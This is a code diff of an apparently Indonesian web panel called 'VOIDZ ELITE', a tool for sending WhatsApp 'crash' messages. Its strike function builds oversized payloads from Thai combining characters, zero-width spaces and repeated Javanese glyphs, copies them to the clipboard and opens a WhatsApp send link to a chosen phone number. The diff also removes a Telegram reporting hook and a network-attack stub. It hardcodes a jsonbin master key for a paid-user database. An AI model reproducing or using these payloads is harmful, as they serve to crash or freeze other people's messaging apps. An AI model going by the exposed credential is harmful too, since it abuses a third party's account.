@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>VOIDZ ELITE V1 - SUPREME EDITION</title>
+    <title>VOIDZ ELITE V1</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
     <style>
@@ -65,7 +65,7 @@
             <div id="tabHOME" class="tab-content active-tab">
                 <div class="header-title neon-red">VOIDZ ELITE V1</div>
                 <div class="banner-container"><video id="homeVideo" loop muted playsinline style="width:100%; height:100%; object-fit:cover;"><source src="dashboard.mp4" type="video/mp4"></video></div>
-                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[SYSTEM LIVE] - OPERATOR READY - MONITORING PORT 8080</marquee>
+                <marquee style="color:var(--fire); font-size:9px; margin-bottom:10px;">[DATABASE CONNECTED] - READY TO STRIKE - VOIDZ ELITE 2025</marquee>
                 
                 <div class="home-info">
                     <div class="info-row"><i class="fas fa-user" style="color:var(--fire)"></i><span id="uName" class="info-val">...</span></div>
@@ -79,20 +79,14 @@
             <div id="tabATTACK" class="tab-content">
                 <div class="header-title neon-red" style="margin-top:20px;">STRIKE CENTER</div>
                 <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; border-top:2px solid var(--fire); margin-top:20px;">
-                    <h3 style="color:var(--fire); font-size:12px; margin-bottom:10px; font-family:'Orbitron'">BUG SELECTOR</h3>
-                    <input type="text" id="targetBug" class="input-box" placeholder="Target Number (Ex: 08xxx)">
+                    <h3 style="color:var(--fire); font-size:11px; font-family:'Orbitron'; margin-bottom:10px;">TARGET SELECTOR</h3>
+                    <input type="text" id="targetBug" class="input-box" placeholder="628xxx">
                     <select id="bugType" class="input-box">
                         <option value="WA_CRASH">WA CRASH (LITE)</option>
                         <option value="IP_FREEZE">IP FREEZE (MEDIUM)</option>
                         <option value="SUPREME">SUPREME (HARD)</option>
                     </select>
-                    <button class="btn-main" onclick="startAttack('BUG')">EXECUTE STRIKE</button>
-                </div>
-                
-                <div style="background:var(--card); padding:15px; border-radius:10px; border:1px solid #222; margin-top:15px; border-top:2px solid #00e5ff">
-                    <h3 style="color:#00e5ff; font-size:12px; margin-bottom:10px; font-family:'Orbitron'">NETWORK KILLER</h3>
-                    <input type="text" id="targetWiFi" class="input-box" placeholder="Target Gateway IP">
-                    <button class="btn-main" style="background:#00e5ff" onclick="startAttack('WIFI')">STRIKE NETWORK</button>
+                    <button class="btn-main" onclick="startAttack()">EXECUTE STRIKE</button>
                 </div>
             </div>
 
@@ -113,8 +107,8 @@
         <h3 style="color:var(--fire); font-size:12px; font-family:'Orbitron'">GENERATE UNIT</h3>
         <input type="text" id="gUser" class="input-box" placeholder="NEW ID" style="margin-top:15px;">
         <input type="text" id="gPass" class="input-box" placeholder="ACCESS KEY">
-        <select id="gRole" class="input-box"></select>
-        <select id="gTime" class="input-box"></select>
+        <select id="gRole" class="input-box"><option value="member">MEMBER</option></select>
+        <select id="gTime" class="input-box"><option value="1 MONTH">1 MONTH</option><option value="LIFETIME">LIFETIME</option></select>
         <button class="btn-main" onclick="doGenerate()">PUSH UNIT</button>
         <button onclick="closeModal()" style="color:#444; width:100%; border:none; background:none; margin-top:10px; font-size:9px;">CANCEL</button>
     </div></div>
@@ -123,18 +117,22 @@
         const BIN_ID = '694a5a6fae596e708fabef99', API_KEY = '$2a$10$dgiow6eyY5CjGfEYQtuAQ.E6b5sEA7j91bc4IexzX9cWV3uAksXgW';
         let USER = {}, DB = {}, LOG_HISTORY = [];
 
-        // --- PARTICLE ENGINE (LINGKARAN) ---
+        // --- ASH PARTICLE ENGINE (TETAP KOTAK) ---
         const canvas = document.getElementById('ash-canvas');
         const ctx = canvas.getContext('2d');
         let particles = [];
         function initParticles() {
             canvas.width = window.innerWidth; canvas.height = window.innerHeight;
             particles = [];
-            for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*1.5 + 0.5, d: Math.random()*0.6 + 0.2 });
+            for(let i=0; i<60; i++) particles.push({ x: Math.random()*canvas.width, y: Math.random()*canvas.height, s: Math.random()*2, d: Math.random()*0.5 + 0.2 });
         }
         function drawParticles() {
-            ctx.clearRect(0,0,canvas.width, canvas.height); ctx.fillStyle = "rgba(200,200,200,0.5)";
-            particles.forEach(p => { ctx.beginPath(); ctx.arc(p.x, p.y, p.s, 0, Math.PI*2); ctx.fill(); p.y -= p.d; if(p.y < 0) p.y = canvas.height; });
+            ctx.clearRect(0,0,canvas.width, canvas.height); 
+            ctx.fillStyle = "rgba(255,255,255,0.4)";
+            particles.forEach(p => { 
+                ctx.fillRect(p.x, p.y, p.s, p.s); // TETAP KOTAK
+                p.y -= p.d; if(p.y < 0) p.y = canvas.height; 
+            });
             requestAnimationFrame(drawParticles);
         }
         initParticles(); drawParticles();
@@ -143,22 +141,14 @@
 
         function addTerminalLog(action, detail) {
             const time = new Date().toLocaleTimeString();
-            const logMsg = `<div class="log-entry"><span style="color:var(--fire)">[${time}]</span> <span style="color:#00e5ff">${action}</span>: ${detail}</div>`;
-            LOG_HISTORY.unshift(logMsg);
-            const container = document.getElementById('logContent');
-            if(container) container.innerHTML = LOG_HISTORY.join('');
+            LOG_HISTORY.unshift(`<div class="log-entry"><span style="color:var(--fire)">[${time}]</span> <span style="color:#00e5ff">${action}</span>: ${detail}</div>`);
+            if(document.getElementById('logContent')) document.getElementById('logContent').innerHTML = LOG_HISTORY.join('');
         }
 
-        async function sendTele(msg) {
-            const token = localStorage.getItem('v_token'), chat = localStorage.getItem('v_chat');
-            if(!token || !chat) return;
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent("VOIDZ SPY: " + msg)}`);
-        }
-
-        // --- AUTH SYSTEM ---
+        // --- AUTH SYSTEM (IGNITE) ---
         async function auth() {
             const u = document.getElementById('lUser').value.trim(), p = document.getElementById('lPass').value.trim(), btn = document.getElementById('btnLog');
-            if(!u || !p) return notify("DATA KOSONG!");
+            if(!u || !p) return notify("LENGKAPI DATA!");
             btn.disabled = true; btn.innerText = "IGNITING...";
             try {
                 const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, { headers: { 'X-Master-Key': API_KEY, 'X-Bin-Meta': false } });
@@ -169,56 +159,89 @@
                     document.getElementById('mainApp').style.display = 'block';
                     document.getElementById('bottomNav').style.display = 'flex';
                     if(USER.role === 'owner') document.getElementById('navLogs').style.display = 'flex';
-                    renderHome(); addTerminalLog("SYSTEM", `WELCOME OPERATOR: ${u}`);
+                    renderHome(); addTerminalLog("SYSTEM", "AUTHORIZED");
                     document.getElementById('homeVideo').play();
                 } else { throw "ERR"; }
             } catch(e) { notify("AKSES DITOLAK!"); btn.disabled = false; btn.innerText = "IGNITE"; }
         }
 
         function renderHome() {
-            document.getElementById('uName').innerText = USER.id;
+            // FITUR MAHKOTA KHUSUS OWNER
+            const nameDisplay = USER.role === 'owner' ? USER.id + " 👑" : USER.id;
+            document.getElementById('uName').innerText = nameDisplay;
+            
             const rEl = document.getElementById('uRole');
             rEl.innerText = USER.role.toUpperCase();
             if(USER.role === 'owner') rEl.classList.add('neon-red');
+            
             document.getElementById('uQuota').innerText = USER.role === 'owner' ? '∞' : USER.quota;
             document.getElementById('uExp').innerText = USER.exp;
             
             const m = document.getElementById('menuContainer'); m.innerHTML = "";
-            m.innerHTML += `<div onclick="notify('OS: ' + navigator.platform)" style="background:var(--card); padding:15px; text-align:center; border:1px solid #ff00ff; border-radius:10px;"><i class="fas fa-mobile-alt" style="color:#ff00ff"></i><br><span style="font-size:9px;">DEVICE</span></div>`;
-            if(USER.role !== 'member') m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-plus" style="color:var(--fire)"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
+            
+            // FITUR DELETE & GENERATE KHUSUS OWNER
+            if(USER.role === 'owner') {
+                m.innerHTML += `<div onclick="openGen()" style="background:var(--card); padding:15px; text-align:center; border:1px solid var(--fire); border-radius:10px;"><i class="fas fa-user-plus" style="color:var(--fire)"></i><br><span style="font-size:9px;">GENERATE</span></div>`;
+                m.innerHTML += `<div onclick="manageDelete()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #f00; border-radius:10px;"><i class="fas fa-user-minus" style="color:#f00"></i><br><span style="font-size:9px;">DELETE</span></div>`;
+            }
+            
             m.innerHTML += `<div onclick="location.reload()" style="background:var(--card); padding:15px; text-align:center; border:1px solid #444; border-radius:10px;"><i class="fas fa-power-off" style="color:#444"></i><br><span style="font-size:9px;">EXIT</span></div>`;
         }
 
-        function startAttack(m) {
-            const target = document.getElementById(m === 'WIFI' ? 'targetWiFi' : 'targetBug').value.trim();
-            if(!target) return notify("TARGET KOSONG!");
+        // --- STRIKE REDIRECT SYSTEM ---
+        function startAttack() {
+            const target = document.getElementById('targetBug').value.trim();
+            if(!target) return notify("ISI NOMOR!");
+            
+            const type = document.getElementById('bugType').value;
+            let payload = "";
+            if(type === 'WA_CRASH') payload = "VOIDZ-LITE ⚡\n" + "ฏ๎๎๎".repeat(50);
+            else if(type === 'IP_FREEZE') payload = "VOIDZ-MED ❄️\n" + "\u200B".repeat(2500);
+            else payload = "VOIDZ-SUPREME 💀\n" + "ꦾ".repeat(1000) + "҉".repeat(500);
 
-            if(m === 'BUG') {
-                const confirmStrike = confirm("Execute strike to target?");
-                if(!confirmStrike) return;
-                const type = document.getElementById('bugType').value;
-                let payload = "";
-                if(type === 'WA_CRASH') payload = "VOIDZ-LITE\n" + "ฏ๎๎๎".repeat(50);
-                else if(type === 'IP_FREEZE') payload = "VOIDZ-MED\n" + "\u200B".repeat(2500);
-                else payload = "VOIDZ-SUPREME\n" + "ꦾ".repeat(1000) + "҉".repeat(500);
+            // Copy Backup
+            const t = document.createElement("textarea"); t.value = payload; document.body.appendChild(t);
+            t.select(); document.execCommand("copy"); document.body.removeChild(t);
 
-                const t = document.createElement("textarea"); t.value = payload; document.body.appendChild(t);
-                t.select(); document.execCommand("copy"); document.body.removeChild(t);
-
-                let cleanNum = target.replace(/\D/g, ''); 
-                if(cleanNum.startsWith('0')) cleanNum = '62' + cleanNum.slice(1);
-                
-                notify("SENDER READY...");
-                setTimeout(() => { window.open(`https://api.whatsapp.com/send?phone=${cleanNum}&text=${encodeURIComponent(payload)}`, '_blank'); }, 1000);
-            } else {
-                notify("STRIKE NETWORK SENT!");
-            }
-            addTerminalLog("STRIKE", `TARGET: ${target}`);
-            sendTele(`STRIKE ON ${target}`);
+            let cleanNum = target.replace(/\D/g, ''); 
+            if(cleanNum.startsWith('0')) cleanNum = '62' + cleanNum.slice(1);
+            
+            notify("REDIRECTING TO WA...");
+            setTimeout(() => {
+                window.open(`https://api.whatsapp.com/send?phone=${cleanNum}&text=${encodeURIComponent(payload)}`, '_blank');
+                addTerminalLog("STRIKE", `ATTACK ON ${cleanNum}`);
+            }, 1000);
         }
 
-        function switchTab(t, el) { document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); el.classList.add('active'); }
-        function openGen() { document.getElementById('modalGen').style.display = 'flex'; const r = document.getElementById('gRole'), t = document.getElementById('gTime'); r.innerHTML = '<option value="member">MEMBER</option>'; t.innerHTML = '<option value="1 MONTH">1 MONTH</option>'; }
+        async function doGenerate() {
+            const u = document.getElementById('gUser').value.trim(), p = document.getElementById('gPass').value.trim();
+            if(!u || !p) return notify("ISI DATA!");
+            DB[u] = { pw: p, role: "member", exp: document.getElementById('gTime').value, quota: 10 };
+            try {
+                await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(DB) });
+                notify("UNIT PUSHED!"); closeModal();
+            } catch(e) { notify("SYNC FAILED!"); }
+        }
+
+        async function manageDelete() {
+            const target = prompt("ID UNIT YG MAU DIHAPUS:");
+            if(!target || target === USER.id) return notify("INVALID!");
+            if(DB[target]) {
+                if(confirm(`Hapus permanen ${target}?`)) {
+                    delete DB[target];
+                    await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, { method: 'PUT', headers: { 'Content-Type': 'application/json', 'X-Master-Key': API_KEY }, body: JSON.stringify(DB) });
+                    notify("UNIT TERMINATED!"); renderHome();
+                }
+            } else { notify("ID TIDAK ADA!"); }
+        }
+
+        function switchTab(t, el) { 
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active-tab')); 
+            document.getElementById('tab'+t.toUpperCase()).classList.add('active-tab'); 
+            document.querySelectorAll('.nav-btn').forEach(b => b.classList.remove('active')); 
+            el.classList.add('active'); 
+        }
+        function openGen() { document.getElementById('modalGen').style.display = 'flex'; }
         function closeModal() { document.querySelectorAll('.modal').forEach(m => m.style.display = 'none'); }
     </script>
 </body>
